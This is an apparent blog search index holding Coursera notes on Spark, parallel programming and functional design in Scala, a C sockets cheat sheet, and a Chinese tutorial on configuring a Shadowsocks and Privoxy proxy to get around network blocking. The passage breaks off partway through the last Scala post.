<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[[Coursera] Big Data Analysis with Scala and Spark 课程笔记]]></title>
    <url>%2F2018%2F07%2F15%2FCoursera-Big-Data-Analysis-with-Scala-and-Spark-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Note:This blog is intended to record what I learned in Big Data Analysis with Scala and Spark, rather than share the course materials. So there are two things that I won’t put up: my solution to assignments and topics which I’ve mastered already.PLEASE NOTIFY ME if I broke Coursera Honor Code accidentally. Week 1Introduction, Logistics, What You’ll Learn this course is about distributed data parallelism in Spark. the contents of this course: extending data parallel paradigm to the distributed case, using Spark. Spark’s programming model. distributing computation, and cluster topology in Spark. how to improve performance; data locality, how to avoid recomputation and shuffles in Spark. relational operations with DataFrames and Datasets. recommended books and resouces: Learning Spark (2015) (Holden Karau): covering the basics. Spark in Action (2017) (Petar Zecevic): covering the basics, full of examples, first time learning. High Performance Spark (Holden Karau): deeper, how Spark executes jobs, how to squeeze better performance. Advanced Analytics with Spark (2015) (Sandy Ryza): mainly focusing on data science. Mastering Apache Spark 2 (Jacek Laskowski). Data-Parallel to Distributed Data-Parallel shared memory data parallelism: split the data. workers/threads independently operate on the data shards in parallel. combine when done (if necessary) . distributed data parallelism: split the data over several nodes. nodes independently operate on the data shards in parallel. combine when done ( if necessary). distributed data parallalism has a new concern: network latency between workers. Spark implements a distributed data parallel model called Resilient Distributed Datasets (RDDs). Latency distribution introduces important concerns beyond what we had to worry about when dealing with parallelism in the shared memory case: partial failure: crash failures of a subset of the machines involved in a distributed computation . latency: certain operations have a much higher latency than other operations due to network communication. latency cannot be masked completely. fault-tolerance in Hadoop/MapReduce comes at a cost. between each map and reduce step, in order to recover from potential failures, Hadoop/MapReduce shuffles its data and write intermediate data to disk. while spark achieves fault tolerance using ideas from functional programming. keep all data immutable and in-memory. all operations on data are just functional transformations, like regular Scala collections. fault tolerance is achieved by replaying functional transformations over original dataset. RDDs, Spark’s Distributed Collection RDDs seem a lot like immutable sequential or parallel Scala collections. combinators on RDDs: map, flatMap, filter, reduce, fold, aggregate, … difference between two signatures of aggregate methods: 12345678aggregate[B](z: =&gt; B)(seqop: (B, A)=&gt; B, combop: (B, B) =&gt; B): B // Scala, by-nameaggregate[B](z: B)(seqop: (B, A)=&gt; B, combop: (B, B) =&gt; B): B // Spark RDD, by-value/** * I guess aggregate of Spark RDD does not use by-name evaluation because * the computation actually occurs on every worker node, which means the * initial value (by-name parameter) would be evaluated same times as * the number of worker nodes. It does cause performance loss, I guess. */ RDDs can be created in two ways: transforming an existing RDD by high-order functions. from a SparkContext (or SparkSession) object, which defines a handful of methods which can be used to create and populate a new RDD:12parallelize // convert a local Scala collection to an RDD .textFile // read a text file from HDFS or a local file system and return an RDD of String RDDs: Transformation and Actions for Scala collection: transformers: return new collections as results. map, filter, flatMap, groupBy. accessors: return singles values. reduce, fold, aggregate. similarly, Spark defines transformations and actions on RDDs: transformations: return new RDDs. It’s lazy that its result is not immediately computed. actions: compute a result based on an RDD, and either returned or saved to an external storage system. It’s eager (instead of lazy). laziness/eagerness is how we can limit network communication using the programming model. common transformations (lazy): map: map[B](f: A =&gt; B): RDD[B]. flatMap: flatMap[B](f: A =&gt; TraversableOnce[B]). filter: filter(pred: A =&gt; Boolean). distinct: distinct(): RDD[B]. common actions (eager): collect: collect(): Array[T], return all elements from RDD. count: count(): Long, return the number of elements in the RDD. take: take(n: Int): Array[T], return the first n elements of the RDD. reduce: reduce(op: (A, A) =&gt; A). foreach: foreach(f: T =&gt; Unit). Spark computes RDDs the first time they are used in an action, which helps when processing large amounts of data. Spark leverages this by analyzing and optimizing the chain of operations before executing it. 123456val firstlogsWithErrors = lastYearslogs.filter(_.contains("ERROR")) .take(10)/** * The execution of filter is deferred until the take action is applied. * As soon as 10 elements of the filtered RDD have been computed, * firstLogsWithErrors is done. */ transformations on two RDDs: union: union(other: RDD[T]): RDD[T]. intersection: intersection(other: RDD[T]): RDD[T]. subtract: subtract(other: RDD[T]): RDD[T]. cartesian: cartesian[U](other: RDD[U]): RDD[(T, U)]. other useful actions takeSample: takeSample(withRepl: Boolean, num: Int): Array[T], return an array of a random sample of num elements of the dataset, with or without replacement. takeOrdered: takeOrdered(num: Int)(implicit ord: Ordering[T]): Array[T], return the first n elements of the RDDs using either their natural order or a custom comparator. saveAsTextFile: saveAsTextFile(path: String): Unit, write the elements of the dataset as a text file in the local filesystem or HDFS. saveAsSequenceFile: saveAsSequenceFile(path: String): Unit, write the elements of the dataset as a Hadoop SequenceFile in the local filesystem or HDFS. Evaluation in Spark: Unlike Scala Collections! by default, RDDs are re-computed every time you run an action on them, which can be expensive if the dataset is used more than once. luckily, Spark allows us to control what is cached in memory. to tell Spark to cache an RDD in memory, simply call persist() or cache() on it.12345val lastYearsLogs: RDD[String] = ...// logsWithErrors is cached in memory.val logsWithErrors = lastYearsLogs.filter(_.contains("error")).persist()val firstLogsWithErrors = logsWithErrors.take(10)val numErrors = logsWithErrors.count() // faster than no-caching there are many ways to configure how your data is persisted. in memory as regular Java objects. on disk as regular Java objects. in memory as serialized Java objects (more compact). on disk as serialized regular Java objects (more compact). both in memory and disk (spills over to disk to avoid re-computation). one of the most common performance bottlenecks of newcomers to Spark arises from unknownly re-evaluating several transformations when caching coud be used. Cluster Topology Matters! a Spark application is a set of processes running on a cluster. all these processes are coordinated by the driver program. the driver is: the process where the main() method of your program runs. the process running the code that creates a SparkContext, creates RDDs, and stages up or sends off transformations and actions. these processes that run computations and store data for your application are executors. executors: run the tasks that represent the application. return computed results to the driver. provide in-memory storage for cached RDDs. execution of a Spark program: the driver program runs the Spark application, which creates a SparkContext upon start-up. the SparkContext connects to a cluster manager (e.g., Mesos/YARN) which allocates resources. spark acquires executors on nodes in the cluster, which are processes that run computations and store data for your application. next, driver program sends your application code to the executors. finally, SparkContext sends tasks for the executors to run. programmers should know where their code is running to avoid unexpected output or side-effects. Week 2Reduction Operations reduction operations: walk through a collection and combine neighboring elements of the collection together to produce a single combined result. properties of aggregate: parallelizable. (like ‘fold’) possible to change the return type. (like ‘foldLeft’) Spark does not support serial foldLeft or foldRight because doing things serially across a cluster requires lots of synchronization, which is actually difficult. as you will realize after experimenting with Spark a bit, much of the time when working with large-scale data, your goal is to project down from larger/more complex data types. Pair RDDs most common in world of big data processing: operating on data in the form of key-value pairs. in Spark, distributed key-value pairs are PairRDD. Transformations and Actions on Pair RDDs transformations: groupByKey: def groupByKey(): RDD[(K, Iterable[V])]. reduceByKey: def reduceByKey(func: (V, V) =&gt; V): RDD[(K, V)], can be thought of as a combination of groupByKey and reduce-ing on all the values per key. It’s more efficient though, than using each separately. mapValues: def mapValues[U] (f: V =&gt; U) : RDD [(K, U)]. keys: def keys: RDD[K], return an RDD with the keys of each tuple. join. leftOuterJoin/rightOuterJoin. actions: countByKey: def countByKey(): Map[K, Long]. Joins two kinds of joins: inner joins (join). outer joins (leftOuterJoin, rightOuterJoin). the key difference between the two is what happens to the keys when both RDDs don’t contain the same key. inner joins return a new RDD containing combined pairs whose keys are present in both input RDDs. def join[W](other: RDD[(K, W)]): RDD[(K, (V, W))]. outer joins return a new RDD containing combined pairs whose keys don’t have to be present in both input RDDs. def leftOuterJoin[W](other: RDD[(K, W)]): RDD[(K, (V, Option[W]))] def rightOuterJoin[W](other: RDD[(K, W)]): RDD[(K, (Option[V], W))] Week 3Shuffling: What it is and why it’s important shuffling: move data from one node to another to be grouped with its key. shuffles can be an enormous hit due to network latency. groupByKey results in one key-value pair per key. And this single key-value pair cannot span across multiple worker nodes. conceptually, reduceByKey can be thought of as a combination of first doing groupByKey and then reduce-ing on all the values grouped per key. but it’s more efficient though, than using each separately. it is because an pre-reduceByKey can be done in each executor to reduce the amount of data sent over the network. this can result in non-trival gains in performance! Partitioning partitioning: how Spark know which key to put on which machine. The data within an RDD is split into several partitions. properties of partitions: partitions never span multiple machines. i.e., tuples in the same partitions are guaranteed to be on the same machine. each machine in the cluster contains one or more partitions. the number of partitions to use is configurable. By default, it equals to the total number of cores on all executor nodes. two kinds of partitioning available in Spark: hash partitioning: attempts to spread data evenly across partitions based on the key. range partitioning: may be more efficient when Pair RDDs contain keys that have an ordering defined (Int, String). customizing a partitioning is only possible on Pair RDDs. using a range partitioner, keys are partitioned according to: an ordering of keys. a set of sorted ranges of keys. there are two ways to create RDDs with specific partitionings: call partitionBy on an RDD, providing an explicit Partitioner. using transformations that return RDDs with specific partitioners. call partitionBy on an RDD: 123val pairs = purchasesRdd.map(p =&gt; (p.customerld, p.price))val tunedPartitioner = new RangePartitioner(8, pairs)val partitioned = pairs.partitionBy(tunedPartitioner).persist() creating a RangePartitioner requires: specifying the desired number of partitions. providing a Pair RDD with ordered keys. This RDD is sampled to create a suitable set of sorted ranges. NOTE: the result of partitionBy should always be persisted. Otherwise, the partitioning is repeatedly applyed (involving shuffling) each time the partitioned RDD is used. partitioning data using transformations: partitioner from parent RDD: Pair RDDs that are the result of a transformation on a partitioned Pair RDD typically is configured to use the hash partitioner that was used to construct it. automatically-set partitioners: some operations on RDDs automatically result in an RDD with a known partitioner - for when it makes sense. by default, when using sortByKey, a RangePartitioner is used. Further, the default partitioner when using groupByKey, is a HashPartitioner. operations on Pair RDDs that hold to (and propagate) a partitioner: cogroup. groupWith. join. leftOuterJoin. rightOuterJoin. groupByKey. reduceByKey. foldByKey. combineByKey. partitionBy. sort. mapValues (if parent has a partitioner). flatMapValues (if parent has a partitioner). filter (if parent has a partitioner). all other operations will produce a result without a partitioner. why map or flatMap do not preserve partitioner in their result RDDs? because it’s possible for map or flatMap to change the key. the previous partitioner would no longer make sense when key is changed. hence mapValues enables us to still do map transformations without changing the keys, thereby preserving the partitioner.]]></content>
      <categories>
        <category>Open Course</category>
        <category>Coursera</category>
      </categories>
      <tags>
        <tag>Scala</tag>
        <tag>Study Notes</tag>
        <tag>Functional Programming</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Network Programming Cheet Sheet]]></title>
    <url>%2F2018%2F07%2F09%2FNetwork-Programming-Cheet-Sheet%2F</url>
    <content type="text"><![CDATA[Mainly from Unix Network Programming Data Types, Functions and Macros IP Address 1234567891011// IPv4struct in_addr &#123; in_addr_t s_addr;&#125;;struct sockaddr_in &#123; uint8_t sin_len; sa_family_t sin_family; in_port_t sin_port; struct in_addr sin_addr; char sin_zero[8];&#125; 12345678910111213// IPv6struct in6_addr &#123; uint8_t s6_addr[16];&#125;;#define SIN6_LEN /* required for compile-time tests */struct sockadd_in6 &#123; uint8_t sin6_len; sa_family_t sin6_family; in_port_t sin6_port; uint32_t sin6_flowinfo; struct in6_addr sin6_addr; uint32_t sin6_scope_id;&#125;; 123456// generalstruct sockaddr &#123; uint8_t sa_len; sa_family_t sa_family; char sa_data[14];&#125;; MACRO 1234567891011121314151617181920#define INET_ADDRSTRLEN 16#define INET6_ADDRSTRLEN 46// family#define AF_INET // IPv4#define AF_INET6 // IPv6#define AF_LOCAL // Unix域协议#define AF_ROUTE // 路由套接字#define AF_KEY // 密钥套接字// type#define SOCK_STREAM // 字节流套接字#define SOCK_DGRAM // 数据包套接字#define SOCK_SEQPACKET // 有序分组套接字#define SOCK_RAW // 原始套接字// protocol#define IPPROTO_TCP // tcp#define IPPROTO_UDP // udp#define IPPROTO_SCTP //sctp family + type \ AF_INET AF_INET6 AF_LOCAL AF_ROUTE AF_KEY SOCK_STREAM TCP\ SCTP TCP\ SCTP Yes SOCK_DGRAM UDP UDP Yes - - SOCK_SEQPACKET SCTP SCTP Yes - - SOCK_RAW IPv4 IPv6 - Yes Yes main-Functions 123456789101112131415161718192021222324252627#include "sys/socket.h"int socket(int family, int type, int protocol); // return non-negative sockfd if succeed; -1 if errorint connect(int sockfd, const struct sockaddr *servaddr, socklen_t addrlen); // return 0 if succeed; -1 if errorint bind(int sockfd, const struct sockaddr *myaddr, socklen_t addrlen); // return 0 if succeed; -1 if errorint listen(int sockfd, int backlog); // return 0 if succeed; -1 if errorint accept(int sockfd, struct sockaddr *cliaddr, socklen_t *addrlen); // return non-negative sockfd if succeed; -1 if errorint close(sockfd);// sockint getsockname(int sockfd, struct sockaddr *localaddr, socklen_t *addrlen);int getpeername(int sockfd, struct sockaddr *peeraddr, socklen_t *addrlen); // both return 0 if succeed; -1 if error// fork() and exec()#include "unistd.h"pid_t fork(void);int execl(const char *pathname, const char *arg0, ... /* (char *) 0 */);int execv(const char *pathname, char *const *argv[]);int execle(const char *pathname, const char *arg0, ... /* (char *) 0, char *const envp[] */ );int execve(const char *pathname, char *const *argv[], char *const envp[]);int execlp(const char *filename, const char *arg0, ... /* (char *) 0 */ );int execvp(const char *filename, char *const argv[]); // for all exec(), return -1 if error co-Functions 12345678910111213141516// byte-ordering#include "netinet/in.h"uint16_t htons(uint16_t host16bitvalue);uint32_t htonl(uint32_t host32bitvalue);uint16_t ntohs(uint16_t net16bitvalue);uint32_t ntohl(uint32_t net32bitvalue);// address transform#include "arpa/inet.h"int inet_aton(const char *strptr, struct in_addr *addrptr); // return 1 if valid; non-0 if unvalidin_addr_t inet_addr(const char *strptr); // return IPv4 addr if valid; INADDR_NONE if unvalidchar *inet_ntoa(struct in_addr inaddr); // return a pointer which points to a decimal-dot stringint inet_pton(int family, const char *strptr, void *addrptr); // return 1 if succeed; 0 if unvalid expression; -1 if errorconst char *inet_ntop(int family, const void *addrptr, char *strptr, size_t len); // return pointer if succeed; NULL if error 12345// byte-operating#include "string.h"void bzero(void *dest, size_t nbytes);void bcopy(const void *src, void *dest, size_t nbytes);int bcmp(const void *ptrl, const void *ptr2, size_t nbytes); // return 0 if equal; non-0 if not equal]]></content>
      <tags>
        <tag>Cheet Sheet</tag>
        <tag>Network Programming</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux/Mac命令行翻墙]]></title>
    <url>%2F2018%2F07%2F01%2FLinux-Mac%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%BF%BB%E5%A2%99%2F</url>
    <content type="text"><![CDATA[之前翻墙的方式比较2——用ShadowSocks GUI做代理客户端，然后将Network Manager设置为Proxy模式，通过手动切换ShadowSocks GUI的代理模式来决定是否使用代理。这样配置起来很方便，但说实话，用起来还是挺难受的。主要有这么几点原因： 暑期实习让我养成了禁用Network Manager的习惯，直接配置/etc/network/interfaces或/etc/sysconfig/network-scripts/ifcfg-xxx更加直观方便。 每次切换代理模式都要先打开ShadowSocks GUI的设置页面，然后点击选择想要的模式，这样一来还是挺麻烦的，并且会干扰工作状态。 PAC名单的设置非常麻烦，需要自己打开文本，然后手动添加一行规则。试想，一个网站页面打开失败，可能是因为获取脚本没有回应，这时候你需要找到所有失败的请求，将对应的host添加到名单中，这无疑是一个超级麻烦的工作。 最关键的是，这种翻墙方式只能在桌面环境下使用。桌面环境对服务器来说只是浪费资源，而且远程shell也无法操作桌面。最直观的例子就是，aliyun主机无法使用这种方式翻墙。 综合以上几点原因，我决定还是花点时间，重新配置一下翻墙方式。网上查询一些资料后，个人感觉ShadowSocks+Privoxy+SwichyOmega最适合我：兼容shell翻墙，不依赖于桌面环境，而且操作简单，唯一的缺点就是配置起来稍微麻烦一点。试用了一段时间，感觉确实不错，于是一口气在我所有的机器（CentOS 7.2, Linux Mint 17.2, Mac OS 10.11.6, Debian 8.6）上配置了代理。 网上有好几篇文章介绍这种翻墙方式的配置（关键词搜索命令行翻墙、Privoxy即可），我也是参照它们的步骤来实现的。但是感觉它们都不是很完善，因为我在配置的时候还是遇到了不少问题。因此，我还是决定将自己的配置过程贴出来，如果有需求的人正好翻到了我这篇博文，也算是做了一点小贡献；另外，自己以后配置新机器也会更加方便。 配置ShadowSocksShadowSocks分为server端与client端，缺一不可。我的server端部署在Bandwagon的vps上，因此，还需要在自己机器上配置client 端。 安装python、pip，这里可以直接从源安装，Mac好像是自带？ 12sudo apt install python-pip # for Debiansudo yum install python-pip # for RedHat 安装ShadowSocks： 1pip install shadowsocks 创建ShadowSocks启动配置文件/etc/shadowsocks.json： 12345678&#123; "server": "server_ip_addr", "server_port": 443, "local_address": "127.0.0.1", "local_port": 1080, "password": "server_ss_password", "method": "aes-256-cfb"&#125; 各个字段依照server端的配置来填写。 从上述配置文件启动client端： 1sslocal -c /etc/shadowsocks.json 此时，ShadowSocks将监听本地的1080端口，将收到请求转发到server端的443端口，从而实现代理的功能。 但这样还不能实现翻墙，因为ShadowSocks使用的是SOCKS5协议，只支持SOCKS5代理，不支持HTTP、HTTPS代理，下面我们继续配置一个可以将SOCKS5代理转换为其他协议代理的工具——Privoxy。 配置Privoxy 安装Privoxy，这里不同操作系统的安装方式不一样。 Linux是最方便的，直接从源安装即可： 12sudo apt install privoxy # for Debiansudo yum install privoxy # for RedHat Mac OS可以从官网直接下载安装包（link）。 修改配置文件。 对于Linux，配置文件的路径一般为/etc/privoxy/config，而Mac OS上路径稍微有些不同，为/usr/local/etc/privoxy/config。如果你找不到配置文件，建议直接全局搜索关键词privoxy+config。 在配置文件中找到以下两行，进行修改。 123 # 修改为ShadowSocks配置中的local_portforward-socks5 / 127.0.0.1:1080 .listen-address localhost:8118 启动Privoxy： 12sudo privoxy /etc/privoxy/config # for Linuxsudo /Application/Privoxy/startPrivoxy.sh # for Mac OS 现在Privoxy已经在后台运行，监听8118端口，将请求转发到1080端口，实现HTTP、HTTPS代理与SOCKS5代理的转换。 一些零碎的配置安装完ShadowSocks与Privoxy后，我们已经可以命令行翻墙了。 1234sslocal -c /etc/shadowsocks.json 1&gt;/dev/null 2&gt;&amp;1 &amp; # 后台运行ShadowSocks Clientsudo privoxy /etc/privoxy/config # 开启privoxy服务# sudo /Application/Privoxy/startPrivoxy.sh for MacOSexport http_proxy=http://localhost:8118 # 设置HTTP代理地址 效果如下图所示： 可以看到，本机的外网ip发生了变化，这说明代理配置成功，此时也可以试一试wget www.google.com。 如果我们不想用代理该怎么办呢？很简单，直接把变量http_proxy给注销掉（unset http_proxy）即可。不过，这样的操作不够优雅，用户并不会关心（甚至讨厌）配置细节，他们要的仅仅是开启代理、关闭代理两个操作而已。而且注意到ShadowSocks一直运行在后台，一旦这个shell被关闭，那么ShadowSocks进程也会被杀死，其他shell想用代理时只能重新运行ShadowSocks，这太糟糕了。 为了解决以上两个问题，我们可以做一下小配置。 使用nohup让ShadowSocks一直运行： 1nohup sslocal -c /etc/shadowsocks.json 1&gt;/dev/null 2&gt;&amp;1 &amp; 将所有命令操作封装一下。 在主目录下新建脚本文件ss.sh： 1234#! /bin/bashnohup sslocal -c /etc/shadowsocks.json &gt;/dev/null 2&gt;&amp;1 &amp;sudo privoxy /etc/privoxy/config # only for Linux# for Mac OS, sudo /Application/Privoxy/startPrivoxy.sh 在当前shell的profile（.bashrc、.zshrc等等，也可以写在/etc/profile）里，实现两个函数，分别用于开启代理与关闭代理： 12345678function sson() &#123; export http_proxy=http://localhost:8118; export https_proxy=http://localhost:8118; export ftp_proxy=http://localhost:8118;&#125;function ssoff() &#123; unset http_proxy https_proxy ftp_proxy&#125; 现在，你可以运行一次脚本ss.sh，以后想用代理时，直接命令行输入命令sson即可，同理，关闭代理使用ssoff。如果你想实现开机自动运行ShadowSocks和Privoxy（即开机运行ss.sh脚本），直接在/etc/rc.local中添加运行ss.sh的命令即可。 配置Chrome最后，我还需要为浏览器配置代理，这步就比较简单了，全部鼠标操作。 下载并安装插件SwitchyOmega，由于未翻墙不能访问chrome webstore，建议从github（link）下载，我这里提供2.3.21版本的下载（link）。 进入SwitchyOmega的options（选项）界面，在侧边栏中选择proxy（代理），按照下图填写： 在侧边栏中选择auto switch（自动切换），按照下图填写： 注意，填写完Rule List URL后，需要点击下方的Download Profile Now下载翻墙名单gfwlist.txt。 填写完后，点击Apply changes（确认修改）。 现在可以使用Chrome翻墙啦。将插件设置为auto switch模式，此时，名单gfwlist.list内的所有网址会自动走代理，而不在名单的网址不走代理。 回顾最开始我提出来的四个问题，现在好像还剩一个没有解决——PAC列表修改起来很麻烦。其实不然，SwitchyOmega为我们提供了一个很优雅的操作方式。一旦有请求失败，SwitchyOmega会将它们记录下来，此时，我们可以为这些失败的请求设置规则： 如上所示，直接点击Add condition即可将*.atdmt.com设置为proxy模式，以后每次访问以.atdmt.com结尾的网址时，浏览器都会自动走代理。终于，我们不需要自己手动设置PAC名单啦。 以上就是我正在使用的，也是自己非常喜欢的一种翻墙方式，有翻墙需求的朋友不妨尝试一下。]]></content>
      <tags>
        <tag>Shadowsocks</tag>
        <tag>Tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[Coursera] Parallel Programming 课程笔记]]></title>
    <url>%2F2018%2F06%2F28%2FCoursera-Parallel-Programming-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Note:This blog is intended to record what I learned in Parallel Programming, rather than share the course materials. So there are two things that I won’t put up: my solution to assignments and topics which I’ve mastered already.PLEASE NOTIFY ME if I broke Coursera Honor Code accidentally. Week 1Introduction to Parallel Computing at the beginning of 21 century processor frequency scaling hit the power wall. parallism and concurrency are closely related concepts: parallel program uses parallel hardware to execute computation more quickly. Efficiency is its main concern (or speedup). concurrent program may or may not execute multiple executions at the same time. It concerns about improving modularity, responsiveness and maintainability (or convenience). parallelism granularity: bit-level parallelism: processing multiple bits of data in parallel. instruction-level parallelism: executing different instructions from the same instruction stream in parallel. task-level parallelism: executing separate instruction streams in parrel. different forms of parallel hardware. multi-core processor. symmetric multiprocessors. graphics processing unit. field-programmable gate arrays. computer clusters. Parallelism on the JVM IParallelism on the JVM II memory model is a set of rules that describe how threads interact when accessing shared memory. Java Memory Model - the memory model for JVM: two threads writing to separate locations in memory do not need synchroization. a thread X that calls join on another thread Y is guaranteed to observe all the writes by thread Y after join returns. Running Computations in ParallelHow Fast are Parallel Programs? how to estimate the performance of parallelism: empirical measurement. asymptotic analysis, which is important to understand how algorithms scale when input get larger or we have more hardware parallelism available. Benchmarking Parallel Programs when a JVM program starts, it undergoes a period of warmup, after which it achieves its maximum performance. first, the program is interpreted. then, parts of the program are compiled into machine code. later, the JVM may choose to apply additional dynamic optimizations. eventually, the program reaches steady state. Week 2Parallel Sorting implement merge sort in parallel. Data Operations and Parallel Mapping operations on List are not good for parallel implementation, since spliting a list in half and combining them takes linear time. this section mainly concentrate on the parallel implementation of Map operation on Array and Tree. Parallel Fold (Reduce) Operation operation f: (A, A) =&gt; A is associative iff for every x, y, z: f(x, f(y, z)) = f(f(x, y), z) Associativity I operation f: (A, A) =&gt; A is commutative iff for every x, y: f(x, y) = f(y, x) floating point addition is commutative but not associative:12345678910111213scala&gt; val e = 1e-200e: Double = 1.0E-200scala&gt; val x = 1e200x: Double = 1.0E200scala&gt; val mx = -xmx: Double = -1.0E200scala&gt; (x + mx) + eres2: Double = 1.0E-200scala&gt; x + (mx + e)res3: Double = 0.0scala&gt; (x + mx) + e == x + (mx + e)res4: Boolean = false Associativity II for E(x,y,z) = f(f(x,y), z), we say arguments of E can rotate if E(x,y,z) = E(y,z,x), that is: f(f(x,y), z) = f(f(y,z), x). if f is commutative and arguments of E can rotate then f is also associative. Parallel Scan (Prefix Sum) OperationWeek 3Data-Parallel Programming task-parallel programming: a form of parallelization what distributes execution processes across computing nodes. data-parallel programming: a form of parallelization what distributes data across computing nodes. parallel for loop is the simplest form of data-parallel programming: 123for (i &lt;- (0 until xs.length).par) &#123; xs(i) = i&#125; goal of data-parallel scheduler: effiently balance the workload across processors without any knowledge about the w(i) = #iterations. Data-Parallel Operations I most collections in scala can become data-parallel by appending .par. operations reduceLeft, reduceRight, scanLeft, scanRight, foldLeft, foldRight must process the elements sequentially. the fold operation can process the elements in a reduction tree, so it can execute in parallel. Data-Parallel Operations II in order for the fold operation to work correctly, the following relations must hold: 12f(a, f(b, c)) == f(f(a, b), c) // associativityf(z, a) == f(a, z) == a // neutral element we say that the neutral element z and the binary operator f must form a monoid. for f = math.max, we have f(a, (b, c)) == f(f(a, b), c) and f(Int.MinValue, a) == f(a, IntMinValue) = a: 12def max(xs: Array[Int]): Int = xs.par.fold(Int.MinValue)(math.max) the fold operation can only produce values of the same type as the collection that it is called on. Scala Parallel Collections Scala collections hierarchy: Traversable[T] – collection of elements with type T, with operations implemented using foreach. Iterable[T] – collection of elements with type T, with operations implemented using iterator. Seq[T] – an ordered sequence of elements with type T. Set[T] – a set of elements with type T (no duplicates). Map[K, V] – a map of keys with type K associated with values of type V (no duplicate keys). rule: never modify a parallel collection on which a data-parallel operation is in progress. never write to a collection that is concurrently traversed. never read from a collection that is concurrently modified Splitters and Combiners 4 abstractions for data-parallel collections: iterators, splitters, builders, combiners. Iterator: 12345trait Iterator[A] &#123; def next(): A def hasNext: Boolean&#125;def iterator: Iterator[A] // on every collection the Iterator contract: next can be called only if hasNext returns true. after hasNext returns false, it will always return false. Splitter: 12345trait Splitter[A] extends Iterator[A] &#123; def split: Seq[Splitter[A]] def remaining: Int&#125;def splitter: Splitter[A] // on every parallel collection the Splitter contract: after calling split, the original splitter is left in an undefined state. the resulting splitters traverse disjoint subsets of the original splitter. remaining is an estimate on the number of remaining elements. split is an efficient method – $O(log n)$ or better. Builder: 12345trait Builder[A, Repr] &#123; def +=(elem: A): Builder[A, Repr] def result: Repr&#125;def newBuilder: Builder[A, Repr] // on every collection the Builder contract: calling result returns a collection of type Repr, containing the elements that were previously added with +=. calling result leaves the Builder in an undefined state. Combiner: 1234trait Combiner[A, Repr] extends Builder[A, Repr] &#123; def combine(that: Combiner[A, Repr]): Combiner[A, Repr]&#125;def newCombiner: Combiner[T, Repr] // on every parallel collection the Combiner contract: calling combine returns a new combiner that contains elements of input combiners. calling combine leaves both original Combiners in an undefined state. combine is an efficient method – $O(log n)$ or better. Week 4Implementing Combiners Builder is used in sequential collection methods: 1234trait Builder[T, Repr] &#123; def +=(elem: T): this.type def result: Repr&#125; to implement parallel transformer operations, we need an abstraction called a combiner: 123trait Combiner[T, Repr] extends Builder[T, Repr] &#123; def combine(that: Combiner[T, Repr]): Combiner[T, Repr]&#125; the combine operation must be efficient, i.e. execute in $O(log n + log m)$ time, where n and m are the sizes of two input combiners. array cannot be efficiently concatenated. most of these data structures do not have an efficient concatenation or union, providing a combiner for the corresponding collections is not straight forward. but it is indeed possible. Parallel Two-Phase Construction most data structures can be constructed in parallel using two-phase construction. the intermediate data structure is a data structure that: has an efficient combine method – $O(log n + log m)$ or better. has an efficient += method. can be converted to the resulting data structure in $O(n/P)$ time (P is the number of processors). two-phase construction works for in a similar way for other data structures. First, partition the elements, then construct parts of the final data structure in parallel: partition the indices into subintervals. initialize the array in parallel. two-phase construction for hash tables: partition the hash codes into buckets. allocate the table, and map hash codes from different buckets into different regions. two-phase construction for search trees: partition the elements into non-overlapping intervals according to their ordering. construct search trees in parallel, and link non-overlapping trees. two-phase construction for spatial data structures: spatially partition the elements. construct non-overlapping subsets and link them. how can we implement combiners? two-phase construction – the combiner uses an intermediate data structure with an efficient combine method to partition the elements. When result is called, the final data structure is constructed in parallel from the intermediate data structure. an efficient concatenation or union operation – a preferred way when the resulting data structure allows this. concurrent data structure – different combiners share the same underlying data structure, and rely on synchronization to correctly update the data structure when += is called. Conc-tree Data Structure Lists are built for sequential computations – they are traversed from left to right. Trees allow parallel computations – their subtrees can be traversed in parallel. Trees are not good for parallelism unless they are balanced. Amortized, Constant-time Append OperationConc-Tree Combiners]]></content>
      <categories>
        <category>Open Course</category>
        <category>Coursera</category>
      </categories>
      <tags>
        <tag>Scala</tag>
        <tag>Study Notes</tag>
        <tag>Functional Programming</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[Coursera] Functional Program Design in Scala 课程笔记]]></title>
    <url>%2F2018%2F06%2F26%2FCoursera-Functional-Program-Design-in-Scala-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Note:This blog is intended to record what I learned in Functional Program Design in Scala, rather than share the course materials. So there are two things that I won’t put up: my solution to assignments and topics which I’ve mastered already.PLEASE NOTIFY ME if I broke Coursera Honor Code accidentally. Week 1Recap: Functions and Pattern MatchingRecap: CollectionsLecture 1.1 - Queries with For the for notation is essentially equivalent to the common operations of query languages for databases. Lecture 1.2 - Translation of For the Scala compiler translates for-expressions in terms of map, flatMap and a lazy variant of filter. 123456789101112for (x &lt;- e1) yield e2// is translated toe1.map(x =&gt; e2)for (x &lt;- e1 if f; s) yield e2// is translated tofor (x &lt;- e1.withFilter(x =&gt; f); s) yield e2// withFilter is a variant of filter which does not produce an intermediate listfor (x &lt;- e1; y &lt;- e2; s) yield e3// is translated tox1.flatMap(x =&gt; for (y &lt;- e2, s) yield e3) we can use for syntax for our own types as long as we define map, flatMap and withFilter for these types. Lecture 1.3 - Functional Random Generators we can use self =&gt; at the begining of class/trait body to declare an alias for this. 1234567trait Generator[+T] &#123; self =&gt; // an alias for ”this”. def map[S](f: T =&gt; S): Generator[S] = new Generator[S] &#123; // we cannot use this here (but Generator.this is ok) def generate = f(self.generate) &#125;&#125; define a trait Generator[T] that generates random values of type T: 123456789101112131415trait Generator[+T] &#123; def generate: T&#125;// some instancesval integers = new Generator[Int] &#123; val rand = new java.util.Random def generate: Int = rand.nextInt()&#125;val booleans = new Generator[Boolean] &#123; def generate: Boolean = integers.generate &gt; 0&#125;val pairs = new Generator[(Int, Int)] &#123; def generate = (integers.generate, integers.generate)&#125; how can we avoid the new Generator boilerplate since it’s not trivial? Use for syntax: 12345678910111213141516171819202122// Ideally, we would like to write:val booleans = for (x &lt;- integers) yield x &gt; 0def pairs[T, U](t: Generator[T], u: Generator[U]) = for &#123; x &lt;- t y &lt;- u&#125; yield (x, y)// they would be expanded 